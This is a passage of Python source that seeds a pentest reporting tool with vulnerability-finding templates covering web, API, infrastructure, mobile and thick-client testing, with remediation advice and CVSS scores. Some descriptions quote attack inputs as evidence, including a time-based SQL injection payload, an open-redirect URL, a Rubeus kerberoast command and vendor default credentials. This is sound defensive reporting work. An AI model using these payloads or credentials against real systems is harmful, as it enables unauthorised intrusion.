        .filter(ReportTemplate.code.in_(_TEMPLATE_SPECIFIC_OWASP_CODES))
        .all()
    )

    for r in rows:
        template_code = r.template.code if r.template else ""
        current = (r.owasp_category or "").strip()

        if template_code == "api_vapt":
            if _VALID_API.match(current):
                continue
            inferred = _infer_api_2023(r.cwe or "", r.title or "")
            if inferred:
                r.owasp_category = inferred
                updated += 1

        elif template_code == "mobile_pt":
            if _VALID_MOBILE.match(current):
                continue
            inferred = _infer_mobile_2024(r.cwe or "", r.title or "")
            if inferred:
                r.owasp_category = inferred
                updated += 1

        elif template_code == "thick_client_pt":
            if _VALID_DA.match(current):
                continue
            inferred = _infer_desktop_2021(r.cwe or "", r.title or "")
            if inferred:
                r.owasp_category = inferred
                updated += 1

    return updated


def _f(template: str, title: str, severity: str, *,
        description: str, impact: str, remediation: str,
        references: str = "", cwe: str = "", owasp: str = "",
        cvss_score: float | None = None, cvss_vector: str = "",
        extra_templates: list[str] | None = None) -> dict:
    tags: list[str] = [f"template:{template}"]
    for t in (extra_templates or []):
        tags.append(f"template:{t}")
    return {
        "primary": template,
        "title": title,
        "default_severity": _sev(severity),
        "description": description.strip(),
        "impact": impact.strip(),
        "remediation": remediation.strip(),
        "references": references.strip(),
        # Route the bare "CWE-XXX" string through the canonical helper so
        # the seeded row already carries the descriptive name. If the
        # caller passed a non-standard string we keep it untouched.
        "cwe": _canonical_cwe(cwe) or "",
        "owasp_category": owasp,
        "default_cvss_vector": cvss_vector,
        "default_cvss_score": cvss_score,
        "tags": tags,
    }


# ============================================================
# Findings catalogue
# ============================================================

def _findings_catalogue() -> list[dict]:
    F: list[dict] = []

    # ------------------------------------------------------------
    # Web VAPT
    # ------------------------------------------------------------
    F.extend([
        _f("web_vapt", "Stored Cross-Site Scripting (XSS)", "High",
            description="User-supplied content is rendered back into the page without contextual HTML encoding, allowing an attacker to persist arbitrary JavaScript that executes in the browser of every subsequent visitor.\n\nObserved at `/profile/bio` where the bio field is reflected verbatim inside `<div class=\"bio\">…</div>`.",
            impact="An attacker can hijack authenticated sessions, perform actions in the context of any user who views the affected page, deface content, or exfiltrate sensitive data from the DOM.",
            remediation="- Apply contextual output encoding at every sink (HTML, attribute, JS, URL, CSS) using a vetted library.\n- Set a strict Content-Security-Policy that disallows inline scripts.\n- Mark session cookies `HttpOnly` so a successful payload cannot steal them.",
            references="https://owasp.org/www-community/attacks/xss/",
            cwe="CWE-79", owasp="A03:2021",
            cvss_score=7.4, cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "mobile_pt"]),

        _f("web_vapt", "SQL Injection in search parameter", "Critical",
            description="The `q` query parameter on `/search` is concatenated into a SQL statement without parameterisation. Inserting a single quote yielded a database error revealing the SQL fragment.\n\nA time-based blind SQL injection was confirmed with `?q=' OR pg_sleep(5) --`.",
            impact="Full read access to the application database; potentially full write access and command execution depending on database privileges.",
            remediation="- Replace string concatenation with parameterised queries / prepared statements.\n- Run the application's database user under least privilege (no DDL, no `pg_read_server_files`).\n- Add a WAF rule and centralised query logging as defence in depth.",
            references="https://owasp.org/www-community/attacks/SQL_Injection",
            cwe="CWE-89", owasp="A03:2021",
            cvss_score=9.3, extra_templates=["api_vapt"]),

        _f("web_vapt", "Missing security headers (HSTS / CSP / X-Frame-Options)", "Low",
            description="The server response omits one or more of `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`, and `X-Frame-Options`.",
            impact="Browser-side defence-in-depth controls (transport pinning, framing prevention, MIME-sniffing prevention) are not engaged. Individually low impact; combined they extend the attack surface of any other web flaw.",
            remediation="Add the following at the edge proxy:\n```\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload\nContent-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'self'\nX-Content-Type-Options: nosniff\nReferrer-Policy: no-referrer\nX-Frame-Options: DENY\n```",
            references="https://owasp.org/www-project-secure-headers/",
            cwe="CWE-693", owasp="A05:2021",
            cvss_score=3.1, cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"),

        _f("web_vapt", "Session cookie not marked Secure / HttpOnly / SameSite", "Medium",
            description="The session cookie set on login does not carry the `Secure`, `HttpOnly`, and `SameSite` attributes.",
            impact="The cookie can be exfiltrated by client-side JavaScript (XSS) or sent over plaintext channels (downgrade), and is at heightened risk of CSRF.",
            remediation="Set all session cookies with `Secure; HttpOnly; SameSite=Lax` (or `Strict` for sensitive admin sessions).",
            references="https://owasp.org/www-community/HttpOnly",
            cwe="CWE-1004",
            cvss_score=5.4, extra_templates=["api_vapt"]),

        _f("web_vapt", "Cross-Site Request Forgery (CSRF)", "Medium",
            description="State-changing endpoints accept POST requests without an anti-CSRF token, custom header, or SameSite cookie enforcement.\n\nProof of concept: a third-party HTML form auto-submits to `/account/email` and changes the victim's email when they visit the attacker page while logged in.",
            impact="An attacker can have an authenticated victim perform unintended actions: change email, transfer funds, escalate roles, etc.",
            remediation="- Issue a per-session anti-CSRF token and verify it on every state-changing request.\n- Set session cookies `SameSite=Lax` (or `Strict`).\n- Require a custom `X-Requested-With` header for AJAX endpoints.",
            references="https://owasp.org/www-community/attacks/csrf",
            cwe="CWE-352", owasp="A01:2021",
            cvss_score=5.4),

        _f("web_vapt", "Insecure Direct Object Reference (IDOR)", "High",
            description="The `/api/invoices/{id}` endpoint returns any invoice without checking that the authenticated user owns it. Replacing the id in the URL with a value that belongs to another tenant returns 200 with their data.",
            impact="Horizontal privilege escalation — any authenticated user can read or modify resources owned by any other user or tenant.",
            remediation="- Centralise object-level authorisation; every fetch by primary key must check `resource.owner_id == current_user.id` (or an explicit ACL).\n- Add integration tests that assert 403 when crossing tenant boundaries.",
            references="https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            cwe="CWE-639", owasp="A01:2021",
            cvss_score=8.1, extra_templates=["api_vapt", "mobile_pt"]),

        _f("web_vapt", "Verbose error / stack-trace disclosure", "Low",
            description="Unhandled exceptions render the full Python stack trace in the browser response. The trace includes file paths under `/app/`, the framework version, and excerpts of source code.",
            impact="An attacker learns the application's internal layout, framework, and dependency versions — accelerating subsequent vulnerability discovery.",
            remediation="- Disable debug mode in production (`DEBUG=false`, `FLASK_ENV=production`, etc.).\n- Render a generic error page; log the trace server-side only.",
            references="https://owasp.org/www-community/Improper_Error_Handling",
            cwe="CWE-209",
            cvss_score=2.7, extra_templates=["api_vapt"]),

        _f("web_vapt", "Open redirect via `next` parameter", "Low",
            description="The login page accepts a `next=` query parameter and uses its value verbatim as the post-login redirect, with no validation.",
            impact="An attacker can craft `/login?next=https://evil.example.com` and use the legitimate domain as a launching pad for phishing.",
            remediation="- Permit only relative URLs or hosts on an explicit allow-list.\n- Reject URLs that contain `\\`, `//`, or a host part.",
            references="https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards",
            cwe="CWE-601", owasp="A01:2025",
            cvss_score=4.7),

        # ------------------------------------------------------------
        # New web findings sourced from the VibeDocs master tracker
        # template (2026-05-15). Every entry carries its OWASP Top 10
        # 2025 category (A01-A10) + CWE + CVSS 4.0 vector + score.
        # ------------------------------------------------------------
        _f("web_vapt", "Exposure of User Email Address in GET URL", "Medium",
            description="The application transmits user email addresses (and similar PII identifiers) inside `GET` query strings. Observed at `/login?provider=SP&redirect_path=&user=alice@example.com` where the email is reflected in the URL and consequently in the server access log, the upstream proxy, the CDN edge cache, the browser history, and any external referrer headers.",
            impact="This allows attackers (and any unauthorised internal party with access to logs or analytics) to obtain sensitive identifiers such as usernames / emails. Sensitive identifiers in URLs are persisted by default across most web infrastructure — server, CDN, monitoring stack, and the user's own browser history.",
            remediation="- Use `POST` requests with sensitive identifiers in the request body rather than `GET` query strings.\n- If a redirect must carry an identifier, send it inside a server-side session (HttpOnly cookie) or a signed short-lived token.\n- Audit access logs / WAF logs / CDN logs and rotate or scrub the captured PII.",
            references="https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url",
            cwe="CWE-598", owasp="A02:2025",
            cvss_score=5.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Insufficient Session Expiration", "Medium",
            description="User sessions do not expire after prolonged use or inactivity. Session tokens (JWT / API tokens / cookies) issued at login remain valid indefinitely and allow continuous access without forcing re-authentication.",
            impact="An attacker who obtains a session token (via XSS, token theft, lost device, etc.) retains access indefinitely. Long-lived sessions also limit the consultant's ability to audit who is currently authenticated and complicate incident-response token revocation.",
            remediation="- Enforce BOTH an inactivity timeout (recommended 15-30 minutes for web applications) AND an absolute session lifetime (e.g. 8-12 hours).\n- On the server, treat the session as the source of truth — don't trust client-side expiry alone.\n- Provide an explicit logout that revokes the server-side session.",
            references="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration",
            cwe="CWE-613", owasp="A07:2025",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Cross-Origin Resource Sharing (CORS) Misconfiguration", "High",
            description="The application's `Access-Control-Allow-Origin` header reflects untrusted origins or contains wildcards / overly-broad subdomain patterns. Observed: a request from `https://evil.sandbox.example.com` is mirrored back into `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials: true` is also returned.",
            impact="Allows unauthorised cross-origin domains to read sensitive responses (including authenticated session data) via CORS. An attacker who controls or registers a domain matching the lax pattern can exfiltrate API responses straight from the victim's browser.",
            remediation="- Restrict `Access-Control-Allow-Origin` to an explicit allow-list of fully-qualified origins.\n- Never combine a wildcard origin with `Access-Control-Allow-Credentials: true`.\n- Avoid origin-reflection patterns (`Access-Control-Allow-Origin: <whatever client sent>`).",
            references="https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
            cwe="CWE-942", owasp="A05:2025",
            cvss_score=7.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Username Enumeration", "Low",
            description="The login / forgot-password / signup endpoints return responses that differ depending on whether the supplied account exists. An attacker can enumerate valid usernames or emails without authentication.",
            impact="Allows attackers to discover valid usernames or email addresses, aiding subsequent brute-force, password-spraying, or targeted phishing campaigns. Disclosure is especially damaging on applications whose user list is itself sensitive (HR, healthcare, customer portals).",
            remediation="- Return a generic response for both existing and non-existing accounts on all authentication-related endpoints (`Account not found` and `Wrong password` should look identical).\n- Ensure the response time, response body, status code, and any side-effects (email sent, account locked) are uniform.\n- Consider rate-limiting and CAPTCHA on enumeration-prone endpoints.",
            references="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account",
            cwe="CWE-204", owasp="A07:2025",
            cvss_score=5.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Clickjacking", "Low",
            description="The application's pages can be embedded inside a third-party `<iframe>` because no anti-framing protection is in place. Verified by loading the page inside `<iframe src='...'></iframe>` on an attacker-controlled host — the page rendered normally.",
            impact="An attacker can overlay invisible / styled controls on top of the legitimate UI and trick the victim into clicking buttons they didn't intend to click (transfer funds, change settings, grant OAuth scopes, etc.). Requires social engineering to deliver the framing page, but mitigation is trivial.",
            remediation="- Set `X-Frame-Options: DENY` (or `SAMEORIGIN` if framing inside the same origin is required).\n- Set `Content-Security-Policy: frame-ancestors 'none'` (or an explicit origin allow-list). CSP `frame-ancestors` supersedes `X-Frame-Options` on modern browsers.\n- Add JavaScript frame-busting only as a last-resort defence-in-depth.",
            references="https://owasp.org/www-community/attacks/Clickjacking",
            cwe="CWE-1021", owasp="A05:2025",
            cvss_score=4.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("web_vapt", "Missing Security Headers", "Low",
            description="The web application response is missing one or more standard security headers: `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Content-Security-Policy`, `Referrer-Policy`.",
            impact="Increases susceptibility to a range of browser-side attacks: clickjacking (missing X-Frame-Options), HTTPS downgrade (missing HSTS), MIME-sniffing XSS (missing X-Content-Type-Options), and broader injection attacks (missing CSP). Each header individually is low-impact; combined they extend the attack surface of any other web flaw.",
            remediation="Ensure the following headers are set on every response at the edge proxy / application:\n```\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload\nContent-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'none'\nReferrer-Policy: no-referrer\n```",
            references="https://owasp.org/www-project-secure-headers/",
            cwe="CWE-693", owasp="A05:2025",
            cvss_score=3.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"),

        _f("web_vapt", "Cookie Missing Secure Flag", "Medium",
            description="The application sets cookies (including session tokens) without the `Secure` attribute. These cookies are also transmitted over unencrypted HTTP connections during the initial request before the upgrade to HTTPS.",
            impact="Cookies — including potentially sensitive session tokens — can be intercepted in plaintext over insecure networks (e.g. public Wi-Fi). Particularly damaging if the application allows access over HTTP at all, or if users operate in untrusted network environments. Increases the risk of session hijacking and MITM attacks.",
            remediation="- Set the `Secure` attribute on every cookie that carries sensitive data.\n- Enforce HTTPS across the entire application using HTTP Strict Transport Security (HSTS).\n- Audit all cookies set by the application for the standard set of flags: `Secure; HttpOnly; SameSite=Lax` (or `Strict`).",
            references="https://owasp.org/www-community/controls/SecureCookieAttribute",
            cwe="CWE-614", owasp="A05:2025",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Multiple Concurrent Login Sessions Allowed", "Low",
            description="The application allows the same account (including admin accounts) to be logged in from multiple endpoints simultaneously. No detection or warning is presented to the user when a second session starts.",
            impact="Concurrent logins make session-hijack detection harder and allow compromised credentials to be used silently in parallel with the legitimate user. On admin / privileged accounts this also makes resource-misuse auditing difficult (shared accounts can be exploited by multiple parties simultaneously), and tracking user activities for accountability becomes impractical.",
            remediation="- Permit only one active session per user; new logins invalidate the previous session OR prompt the user to confirm.\n- Surface a list of active sessions in the user's account page and provide an explicit `Sign out everywhere` action.\n- Alert on concurrent logins from geographically distant IPs.",
            references="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
            cwe="CWE-384", owasp="A07:2025",
            cvss_score=4.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),
    ])

    # ------------------------------------------------------------
    # API PT
    # ------------------------------------------------------------
    F.extend([
        _f("api_vapt", "Missing rate limiting on authentication endpoint", "Medium",
            description="`POST /api/auth/login` accepts unlimited requests per minute per IP and per account. Burpsuite's intruder ran 1 000 candidate passwords in under two minutes without throttling.",
            impact="Attackers can brute-force credentials, enumerate accounts, and trivially mount credential-stuffing campaigns.",
            remediation="- Apply per-IP and per-username rate limits (e.g. 5 attempts / 5 min then lockout).\n- Audit and alert on bursts.\n- Encourage / enforce MFA on accounts.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
            cwe="CWE-307", owasp="API4:2023",
            cvss_score=6.9),

        _f("api_vapt", "Broken Object-Level Authorization (BOLA)", "Critical",
            description="`GET /api/v1/orders/{order_id}` returns any order without verifying the requester is the owner.",
            impact="Mass data exfiltration of orders, PII, and order amounts across the entire customer base.",
            remediation="Enforce per-object authorisation at the resolver layer. Treat `current_user.id` as the implicit filter on every fetch.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
            cwe="CWE-639", owasp="API1:2023",
            cvss_score=9.3, extra_templates=["web_vapt", "mobile_pt"]),

        _f("api_vapt", "Excessive Data Exposure in `/users/me`", "Medium",
            description="`/api/users/me` returns the entire User row including `password_hash`, `mfa_secret`, and internal flags. Clients only need a handful of fields.",
            impact="Sensitive material is exposed to every authenticated client and is at risk of leakage through logs, caches, and proxies.",
            remediation="- Define a strict response schema and serialise only the whitelisted fields.\n- Don't rely on the client to ignore fields it doesn't need.",
            references="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
            cwe="CWE-213", owasp="API3:2023",
            cvss_score=5.9),

        _f("api_vapt", "GraphQL introspection enabled in production", "Low",
            description="Introspection queries return the full schema, types, and mutation list on the production endpoint.",
            impact="Increases attack surface by handing an attacker a precise schema with every operation name and field type.",
            remediation="Disable introspection in production; gate behind authenticated admin or an explicit feature flag.",
            cwe="CWE-200",
            cvss_score=3.7),

        _f("api_vapt", "JWT signed with `none` algorithm accepted", "Critical",
            description="The API accepts JWTs whose header declares `alg: none`. A token forged with no signature is treated as authentic.",
            impact="Trivial authentication bypass — anyone can mint a token claiming any user identity.",
            remediation="Pin the verification algorithm to the issuer's algorithm (e.g. `RS256` only). Reject `none` outright.",
            cwe="CWE-347",
            cvss_score=9.8, extra_templates=["web_vapt", "mobile_pt"]),

        _f("api_vapt", "CORS configured with `Access-Control-Allow-Origin: *` + credentials", "High",
            description="API responses include both `Access-Control-Allow-Origin: *` (or reflected origin) and `Access-Control-Allow-Credentials: true`. Modern browsers reject the combination, but older / non-browser clients honour it.",
            impact="Cross-origin code can read authenticated responses, leading to data exfiltration from authenticated sessions in non-browser contexts.",
            remediation="- Restrict allowed origins to an explicit list.\n- Never combine `*` with credentials.\n- Validate the `Origin` header against the allow-list before reflecting.",
            cwe="CWE-942",
            cvss_score=7.1, extra_templates=["web_vapt"]),

        _f("api_vapt", "Mass assignment on PATCH /users/{id}", "High",
            description="`PATCH /users/{id}` accepts an arbitrary JSON body and persists every supplied key. Setting `{ \"is_admin\": true }` succeeds for the authenticated user themselves.",
            impact="Vertical privilege escalation: any user can promote themselves to administrator.",
            remediation="Define explicit input schemas; reject unknown fields. Never pass `request.json` directly into ORM constructors.",
            cwe="CWE-915", owasp="API6:2023",
            cvss_score=8.5),

        _f("api_vapt", "Lack of pagination on collection endpoints", "Low",
            description="`/api/products` returns the entire products table in a single response. With 50k rows and large image URLs the response approaches 30 MB.",
            impact="Resource exhaustion on the server, denial of service from a single client.",
            remediation="Implement cursor- or offset-based pagination with a hard server-side cap.",
            cwe="CWE-770",
            cvss_score=3.7),
    ])

    # ------------------------------------------------------------
    # Infra VAPT / VA
    # ------------------------------------------------------------
    F.extend([
        _f("infra_vapt", "SMBv1 / NTLMv1 enabled on Windows hosts", "High",
            description="Hosts respond to SMB negotiation requests with `SMBv1` accepted, and NTLMv1 was observed in capture.",
            impact="Susceptible to MS17-010 family (EternalBlue), SMB relay attacks, and NTLM hash cracking.",
            remediation="- Disable SMBv1 on every host (`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`).\n- Disable NTLMv1 via Group Policy; require NTLMv2 or Kerberos.",
            cwe="CWE-326", references="https://docs.microsoft.com/security-updates/MS17-010",
            cvss_score=8.1, extra_templates=["infra_va"]),

        _f("infra_vapt", "Default credentials on management interface", "Critical",
            description="The Dell iDRAC / HP iLO / printer admin panel accepted vendor default credentials (`admin / admin`, `root / calvin`).",
            impact="Full out-of-band administrative control of the affected hardware: virtual console, firmware update, power cycle.",
            remediation="- Change default credentials on every device during provisioning.\n- Apply MFA where supported.\n- Place management networks on isolated VLANs.",
            cwe="CWE-1392",
            cvss_score=9.8, extra_templates=["infra_va"]),

        _f("infra_vapt", "Unsupported / end-of-life operating system", "High",
            description="One or more hosts run an OS version that no longer receives security updates from the vendor.",
            impact="Any future vulnerability discovered in the platform will go unpatched, with no remediation path.",
            remediation="Schedule a migration plan onto a supported version. Where migration is impossible, isolate the host on a restricted VLAN and increase monitoring.",
            cwe="CWE-1104",
            cvss_score=7.5, extra_templates=["infra_va"]),

        _f("infra_vapt", "Weak SSL / TLS cipher suites accepted", "Medium",
            description="Service supports `TLSv1.0` / `TLSv1.1`, RC4, 3DES, and / or NULL cipher suites.",
            impact="Vulnerable to BEAST, Sweet32, FREAK, and downgrade attacks against in-transit data.",
            remediation="- Disable TLSv1.0 / 1.1.\n- Restrict cipher suites to AEAD AES-GCM and ChaCha20-Poly1305.\n- Enforce TLSv1.2 minimum (1.3 preferred).",
            cwe="CWE-326",
            cvss_score=5.9, extra_templates=["infra_va", "web_vapt", "api_vapt"]),

        _f("infra_vapt", "Open SNMP community string `public`", "Medium",
            description="UDP/161 responded to `snmpwalk -c public -v1 <host>` returning the full system MIB.",
            impact="Discloses interface counters, ARP table, process list, and other internal-network information that aids subsequent attacks.",
            remediation="- Move to SNMPv3 with authPriv (SHA + AES).\n- If SNMPv2c is unavoidable, change the community to a strong random string and ACL it to the management network.",
            cwe="CWE-200",
            cvss_score=5.3, extra_templates=["infra_va"]),

        _f("infra_vapt", "DNS recursion enabled to the Internet", "Medium",
            description="`dig @<target> google.com` succeeded from an external network. The server answered the recursive query.",
            impact="The host can be used as an amplifier in DNS-based DDoS attacks against third parties.",
            remediation="Restrict recursion to internal networks (`allow-recursion { ... }`). Disable open resolver behaviour.",
            cwe="CWE-406",
            cvss_score=5.3, extra_templates=["infra_va"]),

        _f("infra_vapt", "Anonymous FTP enabled", "Medium",
            description="The FTP service accepts the `anonymous` username with any password and exposes a directory listing.",
            impact="Internal files may be exposed; in some configurations the directory is writeable and can be abused for malware staging.",
            remediation="Disable anonymous access; if file sharing is required use SFTP with key authentication.",
            cwe="CWE-284",
            cvss_score=5.3, extra_templates=["infra_va"]),

        _f("infra_vapt", "Kerberoasting-eligible service accounts", "High",
            description="Service accounts (`svc_*`) have SPNs registered and weak passwords. `Rubeus.exe kerberoast` returned TGS tickets that cracked offline within minutes.",
            impact="Full credential disclosure of the service account, often a privileged identity with broad domain rights.",
            remediation="- Replace service-account passwords with 25+ character random strings or move to Group Managed Service Accounts (gMSA).\n- Remove unnecessary SPNs.\n- Monitor for high volumes of `Event ID 4769` (TGS requests).",
            cwe="CWE-262",
            cvss_score=8.1),
    ])

    # ------------------------------------------------------------
    # Mobile PT
    # ------------------------------------------------------------
    F.extend([
        _f("mobile_pt", "No certificate pinning on the mobile app", "Medium",
            description="The mobile app trusts the system CA store for the API endpoint with no additional pinning. Routing the device through Burp with a self-signed CA installed as a user trust anchor intercepts all traffic.",
            impact="Network-positioned attacker (rogue Wi-Fi, malicious roaming) can read and modify API traffic, exfiltrating credentials and session tokens.",
            remediation="Implement public-key or certificate pinning (e.g. OkHttp `CertificatePinner`, NSPinnedDomains). Pin to the leaf certificate or its intermediate.",
            cwe="CWE-295",
            cvss_score=6.5),

        _f("mobile_pt", "Sensitive data in app logs", "Low",
            description="`logcat` / `idevicesyslog` shows the bearer token, the user's email, and the response payload after login.",
            impact="On rooted / jailbroken devices, or on shared multi-user installs, the log buffer is readable by other apps with the appropriate permission.",
            remediation="- Strip sensitive fields before logging.\n- Compile out verbose logging in release builds (`if (BuildConfig.DEBUG)`).\n- Use ProGuard / R8 to remove debug logging.",
            cwe="CWE-532",
            cvss_score=2.7),

        _f("mobile_pt", "Hardcoded API key in the APK", "Medium",
            description="Decompiling the APK reveals a third-party API key in `Constants.kt`. The key is a paid Google Maps key with no referrer restriction.",
            impact="Abuse of the paid API at the developer's expense; potential to disrupt service or rack up costs.",
            remediation="- Move API access through a backend proxy that holds the key.\n- Where direct mobile usage is unavoidable, restrict the key with an application signing fingerprint and a referrer policy.",
            cwe="CWE-798",
            cvss_score=5.3, extra_templates=["source_code_review", "thick_client_pt"]),

        _f("mobile_pt", "Insecure data storage in shared preferences", "Medium",
            description="`shared_prefs/auth.xml` stores the user's access token in plain text. Reading the file on a rooted device immediately reveals the token.",
            impact="Token theft on lost / jailbroken / shared devices; the attacker authenticates as the user from any device.",
            remediation="Use Android Keystore / iOS Keychain for secrets. Encrypt SharedPreferences via `EncryptedSharedPreferences` if file storage is unavoidable.",
            cwe="CWE-312",
            cvss_score=5.5),

        _f("mobile_pt", "WebView allows JavaScript and `file://` access", "High",
            description="The in-app WebView has `setJavaScriptEnabled(true)` and `setAllowFileAccessFromFileURLs(true)`. Loading attacker-controlled HTML can read local files via `XMLHttpRequest('file:///data/...')`.",
            impact="Remote attacker code in the WebView can read app-private files including session tokens.",
            remediation="- Disable JavaScript unless required.\n- Disable file access from file URLs.\n- Constrain the WebView to a fixed allow-list of origins.",
            cwe="CWE-749",
            cvss_score=8.1),

        _f("mobile_pt", "Root / jailbreak detection absent", "Informational",
            description="The app runs on rooted Android and jailbroken iOS devices without any warning or restriction.",
            impact="On compromised devices the app's runtime integrity assumptions are violated — keystore protections and screen recording barriers may be bypassed.",
            remediation="- Detect common indicators (`su` binaries, Magisk, Cydia, `RootBeer`).\n- Either warn the user or block sensitive functionality (high-value transactions) on flagged devices.\n- Treat the check as defence-in-depth, not security boundary.",
            cwe="CWE-693",
            cvss_score=2.4),

        _f("mobile_pt", "Exported Android component without permission", "High",
            description="`AndroidManifest.xml` declares `android:exported=\"true\"` on an `Activity` / `Service` that performs sensitive actions, without an `android:permission` guard.",
            impact="Any other app on the device can invoke the component without consent, possibly transferring data, triggering payment flows, or opening protected screens.",
            remediation="- Set `android:exported=\"false\"` unless a component must be reachable.\n- Where it must be exported, declare a custom permission with `protectionLevel=\"signature\"` and require it via `android:permission`.",
            cwe="CWE-926",
            cvss_score=7.1),

        _f("mobile_pt", "iOS Plist file contains debug endpoints", "Low",
            description="`Info.plist` exposes `DEBUG_API_BASE_URL` pointing at the development environment.",
            impact="Helps an attacker pivot to development infrastructure which is typically less hardened.",
            remediation="Strip development configuration from release builds; gate behind a build variant.",
            cwe="CWE-540",
            cvss_score=2.7, extra_templates=["source_code_review"]),
    ])

    # ------------------------------------------------------------
    # Thick Client PT
    # ------------------------------------------------------------
    F.extend([
        _f("thick_client_pt", "DLL hijacking via writable PATH directory", "High",
            description="The application loads `version.dll` with an unqualified name. One of the directories on the per-user PATH is world-writable, allowing a stand-in DLL to be loaded.",
            impact="Privilege escalation or code execution in the context of any user who launches the application.",
            remediation="- Use fully-qualified load paths and `LoadLibraryEx` with `LOAD_LIBRARY_SEARCH_SYSTEM32`.\n- Sign all DLLs.\n- Audit the PATH for writable directories.",
            cwe="CWE-427",
            cvss_score=7.8),

        _f("thick_client_pt", "Hardcoded database credentials in binary", "High",
            description="Running `strings` against `app.exe` reveals `Server=10.0.0.5;User=sa;Password=...` in plaintext.",
            impact="Anyone able to download the installer has direct database credentials, often to a privileged account.",
            remediation="- Authenticate the user against the backend, not against the database directly.\n- Use integrated authentication or per-user tokens that the backend exchanges for short-lived DB credentials.",
            cwe="CWE-798",
            cvss_score=8.1, extra_templates=["source_code_review"]),

        _f("thick_client_pt", "Lack of code-signing on installer / EXE", "Low",
            description="The installer and main executable are unsigned, so Windows SmartScreen presents an \"unknown publisher\" warning.",
            impact="Erodes user trust; users get accustomed to clicking through warnings, making it easier for spoofed installers to succeed.",
            remediation="Sign all binaries with a current EV code-signing certificate, including the installer's nested executables.",
            cwe="CWE-347",
            cvss_score=3.3),

        _f("thick_client_pt", "Sensitive data in Windows registry / app config", "Medium",
            description="The application stores the user's saved password under `HKCU\\Software\\Acme\\App\\Password` using simple base64 obfuscation.",
            impact="Local attacker (or anyone with file/registry-read access) recovers cleartext credentials.",
            remediation="Use Windows DPAPI (`CryptProtectData`) or platform keychain APIs to encrypt secrets with the current-user key.",
            cwe="CWE-256",
            cvss_score=5.5),

        _f("thick_client_pt", "Client-side validation only", "Medium",
            description="Input validation lives entirely on the WPF / Electron side. Tampering with the network request bypasses the checks: negative amounts, forbidden role assignments, etc.",
            impact="Business-logic constraints can be violated by a determined user with any HTTP proxy.",
            remediation="Replicate every validation rule on the server. Treat the thick client as untrusted input.",
            cwe="CWE-602",
            cvss_score=6.5),

        _f("thick_client_pt", "Insecure update mechanism (no signature check)", "High",
            description="The auto-updater fetches `update.exe` over HTTPS and executes it without verifying a vendor signature.",
            impact="A network-positioned attacker (or a compromised CDN) can deliver and execute arbitrary code on every client.",
            remediation="- Verify a vendor signature embedded in the update binary or a manifest.\n- Use a stable known public key compiled into the client.\n- Refuse to install on signature mismatch.",
            cwe="CWE-494",
            cvss_score=8.6),

        _f("thick_client_pt", "Sensitive memory not wiped", "Low",
            description="A memory dump after login retains plaintext credentials and session tokens for the lifetime of the process.",
            impact="On compromised systems an attacker with debugger access (or a crash dump) extracts secrets.",
            remediation="Use platform `SecureString` / `mlock` equivalents and zero buffers immediately after use.",
            cwe="CWE-244",
            cvss_score=3.3),

        _f("thick_client_pt", "Verbose log files in user-writable location", "Low",
            description="`%LOCALAPPDATA%\\Acme\\logs\\debug.log` contains full HTTP request and response bodies including auth tokens.",
            impact="Tokens persist on disk far beyond their session lifetime, available to any process the user runs.",
            remediation="Redact sensitive headers / fields before writing logs; rotate logs aggressively; gate debug logging on a runtime flag.",
            cwe="CWE-532",
            cvss_score=3.7),
    ])

    # ------------------------------------------------------------
    # Wi-Fi PT
    # ------------------------------------------------------------
    F.extend([
